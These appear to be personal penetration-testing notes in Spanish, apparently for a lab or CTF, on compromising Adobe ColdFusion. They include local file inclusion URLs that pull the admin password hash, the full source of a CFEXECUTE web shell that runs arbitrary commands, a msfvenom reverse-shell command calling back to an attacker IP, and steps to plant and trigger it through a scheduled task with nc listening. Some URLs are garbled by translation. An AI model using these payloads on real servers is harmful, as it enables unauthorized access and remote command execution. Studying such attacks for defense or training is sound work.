** Attacking ColdFusion article **
https://pentest.tonyng.net/attacking-adobe-coldfusion/

Omisión de autenticación (APSB10-18 y APSB13-03)
Nuestro objetivo final cuando atacamos ColdFusion es básicamente obtener acceso de administrador a la interfaz de administración para que podamos cargar un shell (¡sí!). Debe utilizar diferentes exploits para evitar el inicio de sesión administrativo, según la versión de ColdFusion a la que se enfrente.
ColdFusion 6, 7, 8 (APSB10-18)
En las versiones sin parchear de ColdFusion 6, 7 y 8 existe una vulnerabilidad de inclusión de archivos locales (APSB10-18) que puede explotar para obtener el hash de la contraseña de administrador del archivo password.properties.
ColdFusion 6:
http: // [NOMBRE DEL HOST: PUERTO] /CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password. propiedades% en

ColdFusion 7:
http: // [NOMBRE DEL HOST: PUERTO] /CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password. propiedades% en

ColdFusion 8:
http: // [HOSTNAME: PORT] /CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password. propiedades% en

Todas las versiones (según este sitio [3], pero nunca lo he probado):
http: //sitio/CFIDE/administrator/enter.cfm? locale = .. \ .. \ .. \ .. \ .. \ .. \ .. \ .. \ .. \ .. \ JRun4 \ servers \ cfusion \ cfusion-ear \ cfusion-war \ WEB-INF \ cfusion \ lib \ password.properties% en
Si la inclusión del archivo local es exitosa, el hash de la contraseña (SHA1) se le vuelve a escribir en la página de inicio de sesión administrativo de esta manera (el hash se redujo):

=============================================================================

Formas de crear una reverse shell en ColdFusion:
1. Creando un panel.
	Código:
``` HTML
	
    <html>
    	<body>
     		Notes:<br><br>
    		<ul>
    			<li>Prefix DOS commands with “c:\windows\system32\cmd.exe /c <command>” or wherever cmd.exe is<br>
   				 <li>Options are, of course, the command line options you want to run
   		 		 <li>CFEXECUTE could be removed by the admin. If you have access to CFIDE/administrator you can re-enable it
    		</ul>
    		<p>
    		<cfoutput>
				<table>
				<form method=“POST” action=“cfexec.cfm”>
						<tr><td>Command:</td><td><input type=text name=”cmd” size=50
							<cfif isdefined(“form.cmd”)>value=”#form.cmd#”</cfif>><br></td></tr>
						<tr><td>Options:</td><td> <input type=text name=”opts” size=50
							<cfif isdefined(“form.opts”)>value=”#form.opts#”</cfif>><br></td></tr>
						<tr><td>Timeout:</td><td> <input type=text name=”timeout” size=4
							<cfif isdefined(“form.timeout”)>value=”#form.timeout#”
							<cfelse>value=”5″</cfif>></td></tr>
				</table>
				<input type=submit value=“Exec”>
				</form>

				<cfif isdefined(“form.cmd”)>
					<cfsavecontent variable=“myVar”>
					<cfexecute name = “#Form.cmd#” arguments = “#Form.opts#” timeout = “#Form.timeout#”> 					</cfexecute>
					</cfsavecontent>
					<pre> #myVar# </pre>
				</cfif>
   			 </cfoutput>
    	</body>
    </html>

```
![[Pasted image 20210731155035.png]]
![[Pasted image 20210731155116.png]]

2. Revershell en máquina local y se accede a ella para ejecutar el payload.
	![[Pasted image 20210731155508.png]]
	
	Preparamos el payload
	`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -f raw -o s4vishell.jsp`
	
	Indicamos en la nueva task de ColdFusion la tarea a ejecutar, que haga una llamada a nuestro servidor web donde estaremos alojando el fichero "s4vishell.jsp".	

	El archivo como output será: C:\ColdFusion8\wwwroot\CFIDE\revShell.jsp, ya que sabemos que es la ruta por defecto donde ColdFusion se instala. El mapeo de estos directorios podemos verlo en la pestaña "Mappings" del panel del servicio web.
	
	Una vez la tarea es ejecutada, hará una petición a nuestro servidor y alojará el fichero en la ruta establecida.
	
	Accedemos a la ruta que ejecutará el fichero, mientras tenemos una sesión con nc abierta esperando conexión.

	
	
	

	